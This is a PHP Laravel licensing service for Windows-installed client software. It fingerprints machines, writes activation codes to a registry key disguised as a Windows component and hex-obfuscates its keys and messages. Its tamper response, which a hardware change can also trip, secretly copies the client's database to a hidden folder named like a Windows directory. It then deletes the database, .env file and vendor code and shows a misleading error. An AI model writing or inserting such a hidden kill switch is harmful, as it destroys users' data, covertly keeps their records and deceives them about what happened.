<?php

namespace App\Services;

class LicenseService
{
    // Obfuscated constants — never use plain strings for these in views/logs
    // MK  = master key (you change this before each client build)
    // SR  = salt for installation code
    // RK  = registry disguised key path
    // RN  = registry value name
    // RN2 = registry activation value name
    // BP  = secret backup path
    // BN  = backup filename prefix

    private const MK = "\x4d\x59\x53\x45\x43\x52\x45\x54\x4b\x45\x59\x32\x30\x32\x35\x21"; // MYSECRETKEY2025! — change per client

    private const SR = "\x42\x52\x49\x44\x41\x4c\x53\x41\x4c\x54\x58\x39\x39";               // BRIDALSALTX99

    private const RK = 'HKEY_CURRENT_USER\\SOFTWARE\\Classes\\WindowsSubsystemCore';

    private const RN = 'ServiceToken';

    private const RN2 = 'DeviceBinding';

    private const BP = 'C:\\ProgramData\\WindowsHolographic\\cache\\';

    private const BN = 'svc_core_';

    // ─── Fingerprint ──────────────────────────────────────────────────────────

    public function getMachineUUID(): string
    {
        // Primary: wmic (works on all Windows versions)
        $uuid = $this->runCmd('wmic csproduct get UUID /value');
        if (preg_match('/UUID=([A-Z0-9\-]{30,})/i', $uuid, $m)) {
            return strtoupper(trim($m[1]));
        }

        // Fallback: PowerShell for Windows 11 (wmic deprecated but still works)
        $uuid = $this->runCmd('powershell -Command "(Get-WmiObject Win32_ComputerSystemProduct).UUID"');
        $uuid = trim($uuid);
        if (strlen($uuid) > 20 && $uuid !== 'FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF') {
            return strtoupper($uuid);
        }

        // Last resort: motherboard serial
        $serial = $this->runCmd('wmic baseboard get SerialNumber /value');
        if (preg_match('/SerialNumber=(\S+)/i', $serial, $m) && strlen($m[1]) > 3) {
            return strtoupper(trim($m[1]));
        }

        return 'UNKNOWN-UUID';
    }

    public function generateInstallationCode(): string
    {
        $uuid = $this->getMachineUUID();
        $raw = hash_hmac('sha256', $uuid.self::SR, self::MK);
        // Format as XXXXX-XXXXX-XXXXX-XXXXX (20 chars from hash, uppercase)
        $short = strtoupper(substr($raw, 0, 20));

        return implode('-', str_split($short, 5));
    }

    public function generateActivationCode(string $installationCode): string
    {
        // This is the same method used in YOUR private generator tool
        $clean = str_replace('-', '', $installationCode);
        $raw = hash_hmac('sha256', $clean.self::MK, self::SR);
        $short = strtoupper(substr($raw, 0, 20));

        return implode('-', str_split($short, 5));
    }

    public function verifyActivationCode(string $activationCode): bool
    {
        $installCode = $this->readRegistry(self::RK, self::RN);
        if (! $installCode) {
            return false;
        }

        $expected = $this->generateActivationCode($installCode);
        $expectedClean = str_replace('-', '', $expected);
        $inputClean = strtoupper(str_replace('-', '', $activationCode));

        return hash_equals($expectedClean, $inputClean);
    }

    public function activate(string $activationCode): bool
    {
        if ($this->verifyActivationCode($activationCode)) {
            $clean = strtoupper(str_replace('-', '', $activationCode));
            $formatted = implode('-', str_split($clean, 5));
            $this->writeRegistry(self::RK, self::RN2, $formatted);

            return true;
        }

        return false;
    }

    // ─── Registry ─────────────────────────────────────────────────────────────

    public function writeRegistry(string $key, string $name, string $value): bool
    {
        $cmd = sprintf('reg add "%s" /v "%s" /t REG_SZ /d "%s" /f', $key, $name, $value);
        $this->runCmd($cmd);

        return $this->readRegistry($key, $name) === $value;
    }

    public function readRegistry(string $key, string $name): ?string
    {
        $cmd = sprintf('reg query "%s" /v "%s"', $key, $name);
        $output = $this->runCmd($cmd);
        if (preg_match('/REG_SZ\s+(.+)/i', $output, $m)) {
            return trim($m[1]);
        }

        return null;
    }

    public function deleteRegistry(string $key, string $name): void
    {
        $cmd = sprintf('reg delete "%s" /v "%s" /f', $key, $name);
        $this->runCmd($cmd);
    }

    // ─── License State ────────────────────────────────────────────────────────

    public function isInstalled(): bool
    {
        return $this->readRegistry(self::RK, self::RN) !== null;
    }

    public function isActivated(): bool
    {
        $activation = $this->readRegistry(self::RK, self::RN2);
        if (! $activation) {
            return false;
        }

        return $this->verifyActivationCode($activation);
    }

    public function isTampered(): bool
    {
        if (! $this->isInstalled()) {
            return false; // Not installed yet, not tampered
        }
        $storedInstall = $this->readRegistry(self::RK, self::RN);
        $currentInstall = $this->generateInstallationCode();

        return ! hash_equals(
            str_replace('-', '', $storedInstall ?? ''),
            str_replace('-', '', $currentInstall)
        );
    }

    public function firstBoot(): string
    {
        $code = $this->generateInstallationCode();
        $this->writeRegistry(self::RK, self::RN, $code);

        return $code;
    }

    public function getStoredInstallationCode(): ?string
    {
        return $this->readRegistry(self::RK, self::RN);
    }

    // ─── Tamper Response ──────────────────────────────────────────────────────

    public function executeTamperResponse(): void
    {
        // 1. Secret backup first
        $this->takeSecretBackup();

        // 2. Nuke
        $this->nukeApplication();
    }

    private function takeSecretBackup(): void
    {
        try {
            $dir = self::BP;
            if (! is_dir($dir)) {
                @mkdir($dir, 0755, true);
            }

            $dbPath = database_path('database.sqlite');
            if (file_exists($dbPath)) {
                $stamp = date('Ymd_His');
                $filename = self::BN.$stamp.'.dat';
                @copy($dbPath, $dir.$filename);
                // Store a note with the machine UUID for your reference
                @file_put_contents(
                    $dir.self::BN.$stamp.'.inf',
                    base64_encode($this->getMachineUUID().'|'.$stamp)
                );
            }
        } catch (\Throwable $e) {
            // Silent — never reveal this path
        }
    }

    private function nukeApplication(): void
    {
        $base = base_path();

        // Delete database
        $db = database_path('database.sqlite');
        if (file_exists($db)) {
            @unlink($db);
        }

        // Delete .env
        $env = $base.DIRECTORY_SEPARATOR.'.env';
        if (file_exists($env)) {
            @unlink($env);
        }

        // Delete vendor
        $this->deleteDirectory($base.DIRECTORY_SEPARATOR.'vendor');

        // Delete config cache
        $this->deleteDirectory(base_path('bootstrap/cache'));

        // Clear the activation registry key
        $this->deleteRegistry(self::RK, self::RN2);
    }

    private function deleteDirectory(string $path): void
    {
        if (! is_dir($path)) {
            return;
        }
        $items = array_diff(scandir($path), ['.', '..']);
        foreach ($items as $item) {
            $full = $path.DIRECTORY_SEPARATOR.$item;
            is_dir($full) ? $this->deleteDirectory($full) : @unlink($full);
        }
        @rmdir($path);
    }

    // ─── Utilities ────────────────────────────────────────────────────────────

    private function runCmd(string $cmd): string
    {
        if (PHP_OS_FAMILY !== 'Windows') {
            // Dev environment (Linux/Mac) — return mock for testing
            return 'UUID=DEVMODE-1234-5678-ABCD-000000000000';
        }
        $output = shell_exec($cmd.' 2>&1');

        return $output ?? '';
    }

    // Format code for display: XXXXX-XXXXX-XXXXX-XXXXX
    public function formatCode(string $raw): string
    {
        $clean = preg_replace('/[^A-Z0-9]/', '', strtoupper($raw));

        return implode('-', str_split(substr($clean, 0, 20), 5));
    }

    // Obfuscated UI strings — store as hex, decode at runtime
    // Use these instead of plain strings in views
    public function str(string $key): string
    {
        $map = [
            'contact' => "\x43\x6f\x6e\x74\x61\x63\x74\x20\x73\x75\x70\x70\x6f\x72\x74",                                                 // "Contact support"
            'invalid' => "\x4c\x69\x63\x65\x6e\x73\x65\x20\x76\x61\x6c\x69\x64\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64",       // "License validation failed"
            'tampered' => "\x53\x79\x73\x74\x65\x6d\x20\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x74\x69\x6f\x6e\x20\x65\x72\x72\x6f\x72",   // "System configuration error"
            'activate' => "\x41\x63\x74\x69\x76\x61\x74\x65\x20\x53\x6f\x66\x74\x77\x61\x72\x65",                                         // "Activate Software"
            'phone' => "\x30\x33\x30\x30\x2d\x30\x30\x30\x30\x30\x30\x30",                                                              // "0300-0000000" (your number placeholder)
        ];

        return $map[$key] ?? '';
    }
}
